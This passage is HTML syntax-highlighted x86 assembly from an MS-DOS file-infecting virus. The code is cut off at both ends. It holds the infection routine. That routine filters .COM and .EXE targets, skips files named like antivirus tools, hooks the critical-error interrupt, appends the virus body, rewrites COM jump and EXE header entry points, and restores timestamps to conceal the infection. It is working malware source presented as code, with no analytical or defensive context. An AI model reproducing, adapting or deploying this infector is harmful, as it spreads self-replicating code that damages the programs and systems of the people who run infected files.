</span><span class="sc5">return0</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">moved</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;put last zero after filename</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                
                </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;check extension .COM or .EXE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'E.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_exe</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EX'</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">

</span><span class="sc5">not_exe</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'C.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">return0</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MO'</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">return0</span><span class="sc0">

                </span><span class="sc6">std</span><span class="sc0">                             </span><span class="sc1">;find begin of filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">searchbegin</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">checkname</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">checkname</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">searchbegin</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">checkname</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;check filename</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">names</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">return0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300</span><span class="sc0">                 </span><span class="sc1">;get ctrl-break flag</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;save flag on stack</span><span class="sc0">

                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">;clear the flag</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524</span><span class="sc0">                 </span><span class="sc1">;get int24 vector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;save vector on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni24</span><span class="sc0">          </span><span class="sc1">;install new int24 handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300</span><span class="sc0">                 </span><span class="sc1">;ask file-attributes</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;save attributes on stack</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;clear attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">return1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02</span><span class="sc0">                 </span><span class="sc1">;open the file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">opened</span><span class="sc0">
</span><span class="sc5">return1v</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">return1</span><span class="sc0">

</span><span class="sc5">opened</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;save handle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700</span><span class="sc0">                 </span><span class="sc1">;get file date &amp; time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;save date &amp; time on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc0">               </span><span class="sc1">;read begin of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202</span><span class="sc0">                 </span><span class="sc1">;goto end, get filelength</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldlen</span><span class="sc0">        </span><span class="sc1">;save filelength</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;already infected?</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">      </span><span class="sc1">;EXE ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_EXE</span><span class="sc0">

</span><span class="sc5">do_COM</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">80</span><span class="sc0">        </span><span class="sc1">;maybe a strange EXE?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;check lenght of file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0D0</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">closev</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writeprog</span><span class="sc0">               </span><span class="sc1">;call Engine and write virus</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0E9</span><span class="sc0">       </span><span class="sc1">;put 'JMP xxxx' at begin</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done</span><span class="sc0">

</span><span class="sc5">closev</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">do_EXE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">     </span><span class="sc1">;is it a windows/OS2 EXE ?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">not_win</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">003C</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readbytes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0A</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readbytes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">
                
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closev</span><span class="sc0">

</span><span class="sc5">not_win</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calclen</span><span class="sc0">                 </span><span class="sc1">;check for internal overlays</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0C</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;high memory allocation?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1A</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;overlay nr. not zero?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">                  </span><span class="sc1">;calculate new CS &amp; IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0010</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writeprog</span><span class="sc0">               </span><span class="sc1">;call Engine and write virus</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;put CS in header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;put SS in header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;put IP in header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc5">STACKOFF</span><span class="sc0">  </span><span class="sc1">;put SP in header</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calclen</span><span class="sc0">                 </span><span class="sc1">;put new length in header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0A</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;adjust mem. allocation info</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mem_adjust</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mem_adjust</span><span class="sc0">

</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gotobegin</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;signature</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc0">               </span><span class="sc1">;write new begin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;restore date &amp; time</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc0">                   </span><span class="sc1">;close the file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">return1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore attributes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore int24 vector</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore ctrl-break flag</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Filenames to avoid</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">names</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CO'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SC'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'VS'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'HT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'TB'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'VI'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'IM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'  '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'  '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'  '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'  '</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Write virus to the program</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">writeprog</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">      </span><span class="sc1">;save SS &amp; SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;new stack &amp; buffer-segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
